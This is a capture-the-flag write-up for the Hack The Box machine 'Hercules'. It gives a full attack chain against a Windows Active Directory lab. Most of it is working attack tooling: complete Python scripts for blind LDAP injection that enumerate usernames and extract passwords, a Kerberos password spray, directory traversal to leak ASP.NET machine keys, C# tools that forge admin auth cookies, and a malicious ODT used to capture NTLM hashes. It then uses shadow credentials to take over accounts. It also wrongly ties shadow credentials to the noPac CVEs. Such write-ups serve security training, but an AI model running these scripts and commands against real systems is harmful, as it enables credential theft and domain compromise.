# Hercules HTB Machine - Writeup

## Introduction

**Hercules** is an Insane-difficulty Windows Active Directory machine that demonstrates a complex attack chain involving LDAP injection, certificate-based attacks (ESC3), shadow credentials, and Resource-Based Constrained Delegation (RBCD). This writeup focuses on understanding each technique and why it works.

---

## Phase 1: Reconnaissance & Enumeration

### Initial Port Scan

```
nmap -p- -sCV -T4 10.10.11.91 -oN nmap_full.txt
```

**Key Findings:**
- **Port 53 (DNS)**: Domain Controller
- **Port 88 (Kerberos)**: Authentication service
- **Port 389/636 (LDAP/LDAPS)**: Directory services
- **Port 443 (HTTPS)**: Web application at `https://hercules.htb`
- **Port 5986 (WinRM SSL)**: Remote management

**Learning Point:** These ports indicate a Windows Active Directory Domain Controller. The presence of HTTPS suggests a web application integrated with AD authentication.

### Host Configuration

```
# Add to /etc/hosts (DC hostname MUST come first for Kerberos SPN resolution)
echo "10.10.11.91 dc.hercules.htb hercules.htb" | sudo tee -a /etc/hosts
```

**Why this order matters:** When LDAP/Kerberos clients resolve hostnames, the PRIMARY hostname determines the Service Principal Name (SPN). `ldap/dc.hercules.htb@HERCULES.HTB` will work, but `ldap/hercules.htb@HERCULES.HTB` will fail.

---

## Phase 2: LDAP Injection - Username Enumeration

### Understanding the Vulnerability

The SSO login page at `https://hercules.htb/login` uses LDAP authentication with flawed input validation:

**Vulnerable Regex Pattern:**
```
data-val-regex-pattern="[!\"'<>]"
```

**Critical Omission:** The regex blocks `!`, `\"`, `'`, `<`, `>` but fails to block:
- `*` (wildcard)
- `)` (closes LDAP filter)
- `(` (opens new condition)

This allows LDAP filter injection: `(sAMAccountName=INPUT)` becomes `(sAMAccountName=test*)(description=*))`

### High-Speed Concurrent Username Enumerator

Create `ldap_username_enum.py`:

```python
#!/usr/bin/env python3
# HIGH-SPEED CONCURRENT LDAP USERNAME ENUMERATOR
# Optimized for maximum speed with parallel BFS traversal

import asyncio
import httpx
import re
from collections import deque
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False
USERNAME_FIELD = "Username"
PASSWORD_FIELD = "Password"
REMEMBER_FIELD = "RememberMe"
CSRF_FORM_FIELD = "__RequestVerificationToken"

PASSWORD_TO_SEND = "test"
DOUBLE_URL_ENCODE = True

# HIGH PERFORMANCE SETTINGS
CONCURRENT_TESTS = 20           # Test 20 usernames simultaneously
MAX_SEMAPHORE = 25              # Global connection limit
REQUEST_DELAY = 0.05            # Minimal delay between requests
BATCH_DELAY = 0.1               # Delay between batches

# Optimized charset - prioritize common starting letters
CHARSET = list("abcdefghijklmnopqrstuvwxyz0123456789.-_@")
PRIORITY_CHARS = list("abcdefghjklmnprstw")  # Common AD username starts

MAX_USERNAME_LENGTH = 64
SUCCESS_INDICATOR = "Login attempt failed"

TOKEN_RE = re.compile(
    r'<input[^>]*name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)["\']',
    re.IGNORECASE | re.DOTALL
)

class HighSpeedUsernameEnumerator:
    def __init__(self):
        self.valid_users = set()
        self.request_count = 0
        self.start_time = time.time()
        self.global_semaphore = asyncio.Semaphore(MAX_SEMAPHORE)
        
    def prepare_username_payload(self, username: str, use_wildcard: bool = False) -> str:
        """Prepare username for LDAP injection"""
        if use_wildcard:
            username = username + '*'
        
        if DOUBLE_URL_ENCODE:
            username = ''.join(f'%{byte:02X}' for byte in username.encode('utf-8'))
        
        return username
    
    async def get_token_and_cookies(self, client):
        """Fetch CSRF token with proper regex"""
        try:
            response = await client.get(BASE + LOGIN_PAGE)
            token = None
            
            if "__RequestVerificationToken" in response.cookies:
                token = response.cookies["__RequestVerificationToken"]
            
            match = TOKEN_RE.search(response.text)
            if match:
                token = match.group(1)
            
            return token, dict(response.cookies)
        except Exception as e:
            return None, {}
    
    async def test_username_fast(self, username: str, use_wildcard: bool = False):
        """Fast username test with connection pooling"""
        async with self.global_semaphore:
            async with httpx.AsyncClient(
                verify=VERIFY_TLS,
                headers={
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Referer": BASE + LOGIN_PAGE,
                    "Origin": BASE,
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                timeout=15.0,
                limits=httpx.Limits(max_connections=30, max_keepalive_connections=20)
            ) as client:
                
                token, cookies = await self.get_token_and_cookies(client)
                if not token:
                    return False
                
                username_payload = self.prepare_username_payload(username, use_wildcard)
                
                data = {
                    USERNAME_FIELD: username_payload,
                    PASSWORD_FIELD: PASSWORD_TO_SEND,
                    REMEMBER_FIELD: "false",
                    CSRF_FORM_FIELD: token
                }
                
                try:
                    response = await client.post(
                        TARGET_URL, 
                        data=data,
                        cookies=cookies,
                        follow_redirects=False
                    )
                    
                    self.request_count += 1
                    
                    # Filter app pool accounts
                    if 'appp' in response.text.lower():
                        return False
                    
                    return SUCCESS_INDICATOR in response.text
                    
                except Exception as e:
                    return False
    
    async def test_batch_concurrent(self, usernames, use_wildcard=False):
        """
        CONCURRENT BATCH TESTING
        Test multiple usernames simultaneously
        """
        async def test_wrapper(username):
            """Wrapper for single test with delay"""
            result = await self.test_username_fast(username, use_wildcard)
            await asyncio.sleep(REQUEST_DELAY)
            return username, result
        
        if not usernames:
            return {}
        
        # Run all tests concurrently
        tasks = [test_wrapper(username) for username in usernames]
        results_list = await asyncio.gather(*tasks)
        
        # Convert to dict
        results = {username: is_valid for username, is_valid in results_list}
        return results
    
    async def discover_first_chars_fast(self):
        """
        CONCURRENT FIRST CHARACTER DISCOVERY
        Test all starting characters at once
        """
        print(f"[*] Testing {len(CHARSET)} starting characters concurrently...")
        
        # Test priority chars first (common AD usernames)
        print(f"[*] Testing {len(PRIORITY_CHARS)} priority characters...")
        priority_results = await self.test_batch_concurrent(PRIORITY_CHARS, use_wildcard=True)
        priority_valid = [char for char in PRIORITY_CHARS if priority_results.get(char, False)]
        
        if priority_valid:
            print(f"[+] Priority chars found: {''.join(priority_valid)}")
        
        # Test remaining chars
        remaining_chars = [c for c in CHARSET if c not in PRIORITY_CHARS]
        print(f"[*] Testing {len(remaining_chars)} remaining characters...")
        remaining_results = await self.test_batch_concurrent(remaining_chars, use_wildcard=True)
        remaining_valid = [char for char in remaining_chars if remaining_results.get(char, False)]
        
        if remaining_valid:
            print(f"[+] Additional chars found: {''.join(remaining_valid)}")
        
        valid_chars = priority_valid + remaining_valid
        print(f"[+] Total valid first characters: {''.join(valid_chars)}")
        
        return valid_chars
    
    async def extend_username_concurrent(self, prefix):
        """
        CONCURRENT USERNAME EXTENSION
        Test all possible next characters simultaneously
        """
        if len(prefix) >= MAX_USERNAME_LENGTH:
            return []
        
        candidates = [prefix + char for char in CHARSET]
        
        # Test all candidates concurrently
        results = await self.test_batch_concurrent(candidates, use_wildcard=True)
        
        valid_extensions = [candidate for candidate in candidates if results.get(candidate, False)]
        return valid_extensions
    
    async def verify_exact_username(self, username):
        """Verify username without wildcard"""
        return await self.test_username_fast(username, use_wildcard=False)
    
    async def bfs_discover_concurrent(self):
        """
        HIGH-SPEED BFS DISCOVERY
        Process multiple prefix branches concurrently
        """
        print("[*] Starting concurrent BFS username discovery...")
        
        # Get starting characters
        queue = deque(await self.discover_first_chars_fast())
        
        if not queue:
            print("[!] No valid starting characters found!")
            return []
        
        discovered_prefixes = set(queue)
        complete_usernames = set()
        level = 0
        
        while queue:
            level += 1
            level_size = len(queue)
            print(f"\n[*] Level {level}: Processing {level_size} prefixes")
            
            # Process entire level concurrently
            current_level = list(queue)
            queue.clear()
            
            # Split into batches for progress tracking
            batch_size = CONCURRENT_TESTS
            for i in range(0, len(current_level), batch_size):
                batch = current_level[i:i+batch_size]
                
                print(f"    [*] Batch {i//batch_size + 1}/{(len(current_level)-1)//batch_size + 1}: {len(batch)} prefixes", end=" ")
                
                # Extend all prefixes in batch concurrently
                extension_tasks = [self.extend_username_concurrent(prefix) for prefix in batch]
                extension_results = await asyncio.gather(*extension_tasks)
                
                found_in_batch = 0
                for prefix, extensions in zip(batch, extension_results):
                    if not extensions:
                        # No extensions = complete username, verify it
                        if await self.verify_exact_username(prefix):
                            if prefix not in complete_usernames:
                                complete_usernames.add(prefix)
                                found_in_batch += 1
                                print(f"\n    [✓] FOUND: {prefix}")
                    else:
                        # Add new extensions to queue
                        for extension in extensions:
                            if extension not in discovered_prefixes:
                                discovered_prefixes.add(extension)
                                queue.append(extension)
                
                print(f"-> {found_in_batch} users")
                await asyncio.sleep(BATCH_DELAY)
            
            # Progress summary
            elapsed = time.time() - self.start_time
            rate = self.request_count / elapsed if elapsed > 0 else 0
            print(f"    [+] Level {level} complete: {len(complete_usernames)} users found")
            print(f"    [+] Requests: {self.request_count} ({rate:.1f} req/s)")
            print(f"    [+] Next level: {len(queue)} prefixes to test")
            
            if level > MAX_USERNAME_LENGTH:
                print("[!] Reached maximum depth")
                break
        
        return sorted(complete_usernames)

async def main():
    enumerator = HighSpeedUsernameEnumerator()
    
    print("=" * 60)
    print("HIGH-SPEED CONCURRENT LDAP USERNAME ENUMERATOR")
    print("=" * 60)
    print(f"[*] Concurrent tests: {CONCURRENT_TESTS}")
    print(f"[*] Global request limit: {MAX_SEMAPHORE}")
    print(f"[*] Charset size: {len(CHARSET)}")
    print(f"[*] Max username length: {MAX_USERNAME_LENGTH}")
    print("=" * 60)
    
    try:
        results = await enumerator.bfs_discover_concurrent()
        
        elapsed = time.time() - enumerator.start_time
        
        print("\n" + "=" * 60)
        print("DISCOVERY COMPLETE")
        print("=" * 60)
        print(f"[+] Time elapsed: {elapsed:.2f} seconds")
        print(f"[+] Total requests: {enumerator.request_count}")
        print(f"[+] Requests/sec: {enumerator.request_count/elapsed:.2f}")
        print(f"[+] Usernames found: {len(results)}")
        
        if results:
            print("\n[+] VALID USERNAMES:")
            for i, username in enumerate(results, 1):
                print(f"    {i:2d}. {username}")
            
            # Save results
            with open("usernames.txt", "w") as f:
                for username in results:
                    f.write(f"{username}\n")
            
            print(f"\n[+] Saved to usernames.txt")
            
            # Performance stats
            print("\n[+] PERFORMANCE STATS:")
            print(f"    Average: {elapsed/len(results):.2f} seconds per user")
            print(f"    Rate: {len(results)/(elapsed/60):.1f} users per minute")
            
        else:
            print("[-] No usernames found")
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        if enumerator.valid_users:
            print("[+] Usernames found so far:")
            for username in sorted(enumerator.valid_users):
                print(f"    {username}")
        print(f"[*] Requests made: {enumerator.request_count}")
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())
```

**Run the enumerator:**
```
python3 ldap_username_enum.py
```

**Learning Point:** The BFS (Breadth-First Search) approach with concurrent testing is efficient because:
1. Each level tests characters in parallel (20 at once)
2. Wildcard matching identifies valid prefixes quickly
3. No wildcard match indicates a complete username

**Expected Output:** 33 valid usernames including `admin`, `auditor`, `ken.w`, `natalie.a`, etc.

---

## Phase 3: LDAP Injection - Password Extraction

### Understanding Description Field Extraction

Active Directory user objects have a `description` field often used by administrators to store notes. In misconfigured environments, passwords are sometimes stored here.

**LDAP Filter Injection:**
```
(sAMAccountName=johnathan.j*)(description=c*)  # Tests if description starts with 'c'
```

### High-Speed Password Extractor

Create `ldap_password_extract.py`:

```python
#!/usr/bin/env python3
# LDAP Injection - High-Speed Concurrent Password Extractor
# Optimized for maximum speed with concurrent character testing

import asyncio
import httpx
import re
import string
import urllib3
from collections import deque
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False
USERNAME_FIELD = "Username"
PASSWORD_FIELD = "Password"
REMEMBER_FIELD = "RememberMe"
CSRF_FORM_FIELD = "__RequestVerificationToken"

PASSWORD_TO_SEND = "test"
DOUBLE_URL_ENCODE = True

# HIGH PERFORMANCE SETTINGS
CONCURRENT_CHAR_TESTS = 15      # Test 15 characters at once
CONCURRENT_USER_TESTS = 3       # Test 3 users simultaneously
MAX_SEMAPHORE = 20              # Global request limit
CHAR_DELAY = 0.05               # Minimal delay between char tests
USER_DELAY = 0.1                # Minimal delay between users

# Optimized charset - common first
OPTIMIZED_CHARSET = (
    "acteh" +                    # Most common starting chars
    string.ascii_lowercase +     # a-z
    string.digits +              # 0-9
    string.ascii_uppercase +     # A-Z
    "!@#*()-_." +               # Common special chars
    ",;:?<>[]{}+=\\|'\"`~^%&/"  # Less common
)

MAX_PASSWORD_LENGTH = 50
VERBOSE = True
DEBUG = False

SUCCESS_INDICATOR = "Login attempt failed"

TOKEN_RE = re.compile(
    r'<input[^>]*name=["\']__RequestVerificationToken["\'][^>]*value=["\']([^"\']+)["\']',
    re.IGNORECASE | re.DOTALL
)

KNOWN_USERS = [
    "johnathan.j", "ken.w", "admin", "administrator",  # Priority
    "adriana.i", "angelo.o", "ashley.b", "auditor", "bob.w", 
    "camilla.b", "clarissa.c", "elijah.m", "fiona.c", "heather.s", 
    "jacob.b", "jennifer.a", "jessica.e", "joel.c", "johanna.f", 
    "mark.s", "natalie.a", "nate.h", "patrick.s", "ramona.l", 
    "ray.n", "rene.s", "stephanie.w", "stephen.m", "tanya.r", 
    "tish.c", "vincent.g", "will.s", "zeke.s"
]

class HighSpeedLDAPExtractor:
    def __init__(self):
        self.extracted_passwords = {}
        self.request_count = 0
        self.start_time = time.time()
        self.global_semaphore = asyncio.Semaphore(MAX_SEMAPHORE)
        self.charset = OPTIMIZED_CHARSET
        
    def escape_ldap_filter_value(self, value):
        """Escape LDAP special characters"""
        escape_map = {
            '\\': r'\5c',
            '*': r'\2a',
            '(': r'\28',
            ')': r'\29',
            '\x00': r'\00',
            '/': r'\2f',
        }
        
        result = value
        for char, escape_seq in escape_map.items():
            result = result.replace(char, escape_seq)
        return result
    
    def prepare_injection(self, username, desc_prefix, mode="wildcard"):
        """Prepare LDAP injection payload"""
        escaped = self.escape_ldap_filter_value(desc_prefix)
        
        if mode == "wildcard" and escaped:
            payload = f"{username}*)(description={escaped}*"
        elif mode == "exact" and escaped:
            payload = f"{username}*)(description={escaped}"
        elif mode == "exists":
            payload = f"{username}*)(description=*"
        else:
            payload = f"{username}*)(description={escaped}*"
        
        if DOUBLE_URL_ENCODE:
            payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))
        
        return payload
    
    async def get_token_and_cookies(self, client):
        """Fetch CSRF token"""
        try:
            response = await client.get(BASE + LOGIN_PAGE)
            token = None
            
            if "__RequestVerificationToken" in response.cookies:
                token = response.cookies["__RequestVerificationToken"]
            
            match = TOKEN_RE.search(response.text)
            if match:
                token = match.group(1)
            
            return token, dict(response.cookies)
        except Exception as e:
            if DEBUG:
                print(f"[!] Token error: {e}")
            return None, {}
    
    async def test_injection_fast(self, username, desc_prefix, mode="wildcard"):
        """Fast injection test with connection pooling"""
        async with self.global_semaphore:
            async with httpx.AsyncClient(
                verify=VERIFY_TLS,
                timeout=15.0,
                limits=httpx.Limits(max_connections=30, max_keepalive_connections=20)
            ) as client:
                
                token, cookies = await self.get_token_and_cookies(client)
                if not token:
                    return False
                
                payload = self.prepare_injection(username, desc_prefix, mode)
                
                data = {
                    USERNAME_FIELD: payload,
                    PASSWORD_FIELD: PASSWORD_TO_SEND,
                    REMEMBER_FIELD: "false",
                    CSRF_FORM_FIELD: token
                }
                
                try:
                    response = await client.post(TARGET_URL, data=data, cookies=cookies)
                    self.request_count += 1
                    return SUCCESS_INDICATOR in response.text
                except:
                    return False
    
    async def check_has_description(self, username):
        """Check if user has description field"""
        return await self.test_injection_fast(username, "", "exists")
    
    async def find_next_char_concurrent(self, username, known_prefix):
        """
        CONCURRENT CHARACTER TESTING
        Test multiple characters at the same time
        """
        async def test_char(char):
            """Test single character"""
            test_prefix = known_prefix + char
            result = await self.test_injection_fast(username, test_prefix, "wildcard")
            await asyncio.sleep(CHAR_DELAY)
            return char, result
        
        # Split charset into batches for concurrent testing
        found_chars = []
        
        # Test all characters concurrently in batches
        for i in range(0, len(self.charset), CONCURRENT_CHAR_TESTS):
            batch = self.charset[i:i+CONCURRENT_CHAR_TESTS]
            
            # Run batch concurrently
            tasks = [test_char(char) for char in batch]
            results = await asyncio.gather(*tasks)
            
            # Collect found characters
            for char, is_valid in results:
                if is_valid:
                    found_chars.append(char)
                    if VERBOSE:
                        print(f"    [+] Found: '{char}' at position {len(known_prefix)}")
        
        # Return first found character (usually only one)
        return found_chars[0] if found_chars else None
    
    async def extract_password_fast(self, username):
        """
        FAST PASSWORD EXTRACTION
        Uses concurrent character testing
        """
        print("=" * 50)
        print(f"[*] Extracting: {username}")
        
        # Check description exists
        if not await self.check_has_description(username):
            print(f"[-] No description for {username}")
            return None
        
        print(f"[+] Description exists for {username}")
        
        password = ""
        no_char_count = 0
        
        for position in range(MAX_PASSWORD_LENGTH):
            print(f"[*] Position {position}...", end=" ", flush=True)
            
            # CONCURRENT character search
            char = await self.find_next_char_concurrent(username, password)
            
            if char is None:
                no_char_count += 1
                print("✗")
                if no_char_count >= 2:
                    print(f"[+] Password complete at {position} chars")
                    break
            else:
                password += char
                no_char_count = 0
                print(f"✓ '{char}' -> {password}")
            
            # Verify every 5 characters
            if len(password) % 5 == 0 and len(password) > 0:
                if not await self.test_injection_fast(username, password, "wildcard"):
                    print(f"[!] Verification failed at position {position}!")
                    break
        
        if password:
            print(f"[✓] COMPLETE: {username} = {password}")
            return password
        
        return None
    
    async def extract_multiple_users(self, usernames):
        """
        CONCURRENT USER EXTRACTION
        Process multiple users simultaneously
        """
        async def extract_user_wrapper(username):
            """Wrapper to handle individual user extraction"""
            result = await self.extract_password_fast(username)
            if result:
                self.extracted_passwords[username] = result
                # Save immediately
                with open("extracted_passwords.txt", "a") as f:
                    f.write(f"{username}:{result}\n")
            await asyncio.sleep(USER_DELAY)
            return username, result
        
        # Process users in concurrent batches
        all_results = []
        for i in range(0, len(usernames), CONCURRENT_USER_TESTS):
            batch = usernames[i:i+CONCURRENT_USER_TESTS]
            print(f"\n[*] Processing batch {i//CONCURRENT_USER_TESTS + 1}: {', '.join(batch)}")
            
            tasks = [extract_user_wrapper(user) for user in batch]
            batch_results = await asyncio.gather(*tasks)
            all_results.extend(batch_results)
            
            # Show progress
            found = len(self.extracted_passwords)
            print(f"\n[+] Progress: {found}/{len(usernames)} passwords found")
        
        return all_results

async def main():
    extractor = HighSpeedLDAPExtractor()
    
    print("=" * 60)
    print("HIGH-SPEED CONCURRENT LDAP PASSWORD EXTRACTOR")
    print("=" * 60)
    print(f"[*] Concurrent char tests: {CONCURRENT_CHAR_TESTS}")
    print(f"[*] Concurrent user tests: {CONCURRENT_USER_TESTS}")
    print(f"[*] Global request limit: {MAX_SEMAPHORE}")
    print(f"[*] Charset size: {len(OPTIMIZED_CHARSET)}")
    print(f"[*] Target users: {len(KNOWN_USERS)}")
    print("=" * 60)
    
    try:
        await extractor.extract_multiple_users(KNOWN_USERS)
        
        elapsed = time.time() - extractor.start_time
        
        print("\n" + "=" * 60)
        print("EXTRACTION COMPLETE")
        print("=" * 60)
        print(f"[+] Time elapsed: {elapsed:.2f} seconds")
        print(f"[+] Total requests: {extractor.request_count}")
        print(f"[+] Requests/sec: {extractor.request_count/elapsed:.2f}")
        print(f"[+] Passwords found: {len(extractor.extracted_passwords)}")
        
        if extractor.extracted_passwords:
            print("\n[+] EXTRACTED CREDENTIALS:")
            for user, pwd in sorted(extractor.extracted_passwords.items()):
                print(f"    {user}:{pwd}")
            
            # Save final
            with open("final_passwords.txt", "w") as f:
                for user, pwd in sorted(extractor.extracted_passwords.items()):
                    f.write(f"{user}:{pwd}\n")
            print(f"\n[+] Saved to final_passwords.txt")
        else:
            print("[-] No passwords extracted")
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        if extractor.extracted_passwords:
            print("[+] Passwords found so far:")
            for user, pwd in extractor.extracted_passwords.items():
                print(f"    {user}:{pwd}")
                
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    asyncio.run(main())
```

**Run extractor:**
```
python3 ldap_password_extract.py
```

**Expected Output:**
```
johnathan.j:change*th1s_p@ssw()rd!!
```

**Learning Point:** The password contains special characters `*`, `(`, `)`, `!` which must be properly escaped in LDAP filters using hex encoding (`\2a` for `*`, etc.). The concurrent approach tests 15 characters simultaneously, drastically reducing extraction time from hours to minutes.

---

## Phase 4: Password Spray & Initial Access

### Kerberos Password Spraying

```
# Download kerbrute
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64

# Password spray
./kerbrute_linux_amd64 passwordspray -d hercules.htb --dc 10.10.11.91 \
  usernames.txt 'change*th1s_p@ssw()rd!!'
```

**Output:**
```
[+] VALID LOGIN: ken.w@hercules.htb:change*th1s_p@ssw()rd!!
```

**Learning Point:** Password spraying attempts one password against many accounts. This is stealthier than brute-forcing one account with many passwords, as it avoids account lockout policies. The extracted password from `johnathan.j`'s description field is reused by `ken.w`.

---

## Phase 5: Web Exploitation — Directory Traversal, Machine Key Extraction, Cookie Forgery, and NTLM Capture

**After authenticating as `ken.w`, discovered a file download function vulnerable to directory traversal.**

### Directory Traversal in File Download

**Normal Request:**

```
https://hercules.htb/Home/Download?fileName=registration.pdf
```

**Malicious Request (directory traversal):**

```
https://hercules.htb/Home/Download?fileName=..\..\web.config
```

> Note: In the application the traversal was achieved by manipulating the `fileName` parameter (double-encoded or with `.`/`..` sequences depending on the filter). The above example shows the end goal: retrieving `web.config`.

### Machine Key Extraction

The directory traversal successfully retrieved the `web.config` file which contained the ASP.NET machine keys used to protect Forms Authentication tickets:

```xml
<machineKey
    decryption="AES"
    decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
    validation="HMACSHA256"
    validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80"
/>
```

These keys allow decryption and forging of ASP.NET forms authentication cookies for the application.

### Forms Authentication Cookie Manipulation

With the machine keys, I created small C# utilities to decrypt existing authentication cookies and to forge new ones.

**App.config (used by both projects):**

```xml
<?xml version="1.0"?>
<configuration>
  <system.web>
    <compilation debug="false" targetFramework="4.8" />
    <machineKey
      validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80"
      decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"
      validation="HMACSHA256"
      decryption="AES" />
  </system.web>
</configuration>
```

**Decryption Tool (FormsTicketCrypt):**

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Security;

namespace FormsTicketCrypt
{
    class Program
    {
        static void Main(string[] args)
        {
            // Test if input arguments were supplied.
            if (args.Length == 0)
            {
                Console.WriteLine("Please supply encrypted forms ticket");
                return;
            }
            string encryptedTicket = args[0];
            FormsAuthenticationTicket unencryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);
            Console.WriteLine(unencryptedTicket.Version);
            Console.WriteLine(unencryptedTicket.Name);
            Console.WriteLine(unencryptedTicket.IssueDate);
            Console.WriteLine(unencryptedTicket.Expiration);
            Console.WriteLine(unencryptedTicket.IsPersistent);
            Console.WriteLine(unencryptedTicket.UserData);
            Console.WriteLine(unencryptedTicket.CookiePath);
            Console.ReadLine();
        }
    }
}
```

**Encryption Tool (FormsEncryptor):**

```csharp
using System;
using System.Web.Security;

namespace FormsEncryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            // Take an existing forms cookie
            string encryptedTicket = "E6144BAF6A52D21C245C97C261FCB74EB3A7D83EC6F2EDF940DA34C7A154FF53E7F4F27C87A338F0BB428C1B61C1777F0C0BFDCE6D784D238AF5BCFEA0B35FEB5630242023BB507E319E4F9F75DAC97B7D593F027844B935B2CCB675A0F7EEDA68E0111F2E2811C2838D77B9CD03050C557833B66972A5E85B42459EFFB4B2F66D724F050E3B904F9C79CD04251138316FC899303C5537826AE6513204A7186D";
            string replacedUsername = "web_admin";
            string newRole = "Web Administrators";
            FormsAuthenticationTicket unencryptedTicket = FormsAuthentication.Decrypt(encryptedTicket);
            FormsAuthenticationTicket ticket = new FormsAuthenticationTicket(1,
                //unencryptedTicket.Name, //comment out if you want to change the username
                replacedUsername, //uncomment if you want to change the username
                DateTime.Now,
                DateTime.Now.AddMinutes(120000000), // Add 120 minutes to expiry
                unencryptedTicket.IsPersistent,
                newRole,
                "/");

            string encTicket = FormsAuthentication.Encrypt(ticket);
            Console.WriteLine(encTicket);
        }
    }
}
```

Using these tools I successfully forged a `web_admin` authentication cookie, which granted administrative access to the web application.

### Malicious File Upload and NTLM Hash Capture

With `web_admin` privileges I gained access to a file upload functionality. I created a malicious ODT file using the Bad-ODF tool to capture NTLM credentials from automated document processing.

**Attack Process:**
1. Created malicious ODT file with UNC path pointing to attacker machine
2. Uploaded file through web interface
3. Automated system opened file, triggering NTLM authentication
4. Captured NTLMv2 hash using Responder

**REPO For ODT Generator:** https://github.com/lof1sec/Bad-ODF

**Captured Hash (example):**
```
natalie.a::HERCULES:HASH HIDDEN
```

**Cracked Credentials (example):**
```
hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt
# natalie.a:Prettyprincess123!
```

> Note: In the writeup the exact captured hash string was omitted for safety; the cracked password used for subsequent steps is `Prettyprincess123!`.

**Learning Point:** This demonstrates a supply-chain style attack. If an organization automatically opens or processes uploaded documents, attackers can leverage Windows' automatic authentication to UNC paths to capture hashes. Mitigations include disabling automatic UNC authentication for document handlers, restricting file types, and isolating document-processing services.

---


## Phase 6: Shadow Credentials Attack Chain

### Understanding Shadow Credentials

Shadow Credentials (CVE-2021-42278/42287) exploits the `msDS-KeyCredentialLink` attribute in Active Directory. By adding a certificate to a user's Key Credential, we can authenticate as that user without knowing their password.

**Prerequisites:**
- Write access to target user's `msDS-KeyCredentialLink` attribute
- Active Directory Certificate Services (ADCS) must be present

### Attack Chain: natalie.a → bob.w → auditor

**Step 1: Get Kerberos TGT for natalie.a**

```
# Authenticate to get ticket
impacket-getTGT 'HERCULES.HTB/natalie.a:Prettyprincess123!' -dc-ip 10.10.11.91

# Export ticket
export KRB5CCNAME=$(pwd)/natalie.a.ccache

# Verify ticket
klist
```

**Step 2: Shadow Credentials on bob.w**

```
# Attack bob.w with shadow credentials
certipy-ad shadow auto -u natalie.a@hercules.htb -p 'Prettyprincess123!' \
  -dc-ip 10.10.11.91 -target dc.hercules.htb -account bob.w \
  -dc-host dc.hercules.htb

# Output:
# - bob.w.pfx (certificate)
# - bob.w.ccache (Kerberos ticket)
# - NT hash: 8a65c74e8f0073babbfac6725c66cc3f
```

**Learning Point:** The `shadow auto` command:
1. Generates a self-signed certificate
2. Adds the certificate to bob.w's `msDS-KeyCredentialLink`
3. Requests a TGT using certificate authentication (PKINIT)
4. Extracts the NT hash from the TGT

**Step 3: Enumerate bob.w's Permissions**

```
export KRB5CCNAME=$(pwd)/bob.w.ccache

# Check what bob.w can modify
bloodyAD -d hercules.htb -u bob.w --host dc.hercules.htb -k get writable
```

**Expected:** bob.w has write permissions on multiple OUs including Security Department.

**Step 4: Move Auditor to Web Department**

**Why move Auditor?** The permissions structure requires Auditor to be in Web Department OU for `natalie.a` to have write access to its `msDS-KeyCredentialLink`.

**Configure Kerberos:**
```
sudo tee -a /etc/krb5.conf > /dev/null << 'EOF'
[realms]
    HERCULES.HTB = {
        kdc = dc.hercules.htb
        admin_server = dc.hercules.htb
    }

[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB
EOF
```

**Create LDIF file:**
```
cat > move_auditor.ldif << 'EOF'
dn: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
changetype: modrdn
newrdn: CN=Auditor
deleteoldrdn: 1
newsuperior: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
EOF
```

**Execute move:**
```
export KRB5CCNAME=$(pwd)/bob.w.ccache
ldapmodify -Y GSSAPI -H ldap://dc.hercules.htb -f move_auditor.ldif
```

**Learning Point:** LDAP `modrdn` (Modify Relative Distinguished Name) is the operation for moving objects in the directory tree. The `newsuperior` parameter specifies the new parent container.

**Step 5: Shadow Credentials on Auditor**

```
# Switch back to natalie.a
export KRB5CCNAME=$(pwd)/natalie.a.ccache

# Attack auditor (now in Web Department where natalie.a has permissions)
certipy-ad shadow auto -u natalie.a@hercules.htb -p 'Prettyprincess123!' \
  -dc-ip 10.10.11.91 -target dc.hercules.htb -account auditor \
  -dc-host dc.hercules.htb

# Output:
# - auditor.pfx
# - auditor.ccache
# - NT hash: a9285c625af80519ad784729655ff325
```

**Step 6: WinRM as Auditor - Get User Flag**

```
# Download proper winrmexec
curl -L -o winrmexec.py https://raw.githubusercontent.com/ozelis/winrmexec/main/winrmexec.py

# Connect as auditor
export KRB5CCNAME=$(pwd)/auditor.ccache
python3 winrmexec.py -ssl -port 5986 -k hercules.htb/auditor@dc.hercules.htb -no-pass
```

**In PowerShell:**
```
PS C:\Users\auditor\Desktop> type user.txt
```

